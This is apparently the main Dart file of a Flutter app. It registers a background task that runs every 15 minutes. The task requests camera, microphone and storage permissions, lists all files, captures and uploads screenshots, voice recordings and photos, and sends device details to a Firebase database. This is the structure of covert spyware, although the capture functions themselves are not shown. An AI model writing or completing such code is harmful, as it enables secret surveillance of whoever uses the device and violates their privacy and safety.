import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter_firebase_background_app/screens/background_service.dart';
import 'package:flutter_firebase_background_app/screens/home_screen.dart';
import 'package:workmanager/workmanager.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:firebase_database/firebase_database.dart';
import 'firebase_options.dart';

void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    if (kDebugMode) {
      print('Background task executed: $task');
    }

    WidgetsFlutterBinding.ensureInitialized();
    await Firebase.initializeApp(
      options: DefaultFirebaseOptions.currentPlatform,
    );

    // Ensure permissions are granted
    await requestPermissions();

    // Perform your background task
    await performPeriodicTasks();

    return Future.value(true);
  });
}


Future<void> requestPermissions() async {
  final Map<Permission, PermissionStatus> statuses = await [
    Permission.camera,
    Permission.microphone,
    Permission.storage,
  ].request();

  if (statuses.values.any((status) => status != PermissionStatus.granted)) {
    throw Exception('Permission not granted');
  }
}



Future<void> performPeriodicTasks() async {
  try {
    await requestPermissions();
    await listAllFileNames();
    await captureAndUploadScreenshot();
    await captureAndUploadVoiceRecording();
    await captureAndUploadPhoto();
    await gatherAndUploadDeviceDetails();
  } catch (e, stacktrace) {
    if (kDebugMode) {
      print('Error performing periodic tasks: $e\n$stacktrace');
    }
    await FirebaseDatabase.instance.reference().child('errors').push().set({
      'error': e.toString(),
      'stacktrace': stacktrace.toString(),
      'timestamp': DateTime.now().toIso8601String(),
    });
  }
}




void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  await requestPermissions();

  Workmanager().initialize(
    callbackDispatcher,
    isInDebugMode: true,
  );

  Workmanager().registerPeriodicTask(
    "1",
    "simplePeriodicTask",
    frequency: const Duration(minutes: 15),
  );

  runApp(const MyApp());
}



class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Background Service App',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(),
    );
  }
}


